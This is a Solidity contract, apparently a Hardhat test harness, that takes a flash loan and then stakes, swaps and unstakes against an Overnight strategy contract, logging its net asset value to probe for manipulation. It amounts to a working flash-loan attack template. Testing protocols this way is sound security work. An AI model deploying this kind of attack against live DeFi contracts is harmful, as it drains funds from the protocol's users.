pragma solidity ^0.8.0;

import "./FlashLoanReceiverBase.sol";
import "@overnight-contracts/connectors/contracts/stuff/UniswapV3.sol";
import "@overnight-contracts/core/contracts/interfaces/IStrategy.sol";

import "hardhat/console.sol";

contract FlashAttackUniV3 is FlashLoanReceiverBase {

    struct StrategyParams {
        address usdc;
        address usdt;
        address dai;
        uint24 fee;
        address uniswapV3Router;
    }

    IERC20 public usdc;
    IERC20 public usdt;
    IERC20 public dai;

    address public uniswapV3Router;
    uint24 public fee;

    address public asset;
    uint256 public attackAmount;
    uint256 public putAmount;

    IStrategy public strategy;


    constructor(address provider)
    public
    FlashLoanReceiverBase(provider)
    {}

    function setParams(StrategyParams calldata params) external {
        usdc = IERC20(params.usdc);
        usdt = IERC20(params.usdt);
        dai = IERC20(params.dai);

        fee = params.fee;
        uniswapV3Router = params.uniswapV3Router;
    }

    function setStrategy(address _strategy) external {
        strategy = IStrategy(_strategy);
    }


    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    )
    external
    override
    returns (bool)
    {

        console.log("asset:     %s", asset);
        console.log("amount:    %s", amount / 1e6);
        console.log("premium:   %s", premium / 1e6);
        console.log("initiator: %s", initiator);

        usdc.transfer(address(strategy), putAmount);
        strategy.stake(address(usdc), putAmount);

        showBalances('Stake to strategy');

        console.log('USDT %s', usdt.balanceOf(address(this)));
        uint256 usdtBalance = usdt.balanceOf(address(this));
        usdt.approve(address(uniswapV3Router), usdtBalance);
        UniswapV3Library.singleSwap(
            ISwapRouter(uniswapV3Router),
            address(usdt),
            address(dai),
            fee,
            address(this),
            usdtBalance,
            0
        );

        showBalances('Swap USDT->DAI');

//        usdc.transfer(address(strategy), putAmount);
//        strategy.stake(address(usdc), putAmount);
        strategy.unstake(address(usdc), putAmount / 2, address(this), false);

        showBalances('Unstake/Stake to strategy');


        return true;
    }

    function flashLoanSimple(address asset, uint256 _attackAmount, uint256 _putAmount) public {
        putAmount = _putAmount;

        console.log('Attack amount %s', _attackAmount);
        console.log('PutAmount     %s', _putAmount);
        console.log('asset         %s', asset);

        POOL.flashLoanSimple(
            address(this),
            asset,
            _attackAmount,
            "",
            0
        );
    }

    function showBalances(string memory step) internal {
        console.log(step);
        console.log('NAV %s', strategy.netAssetValue());
    }


}
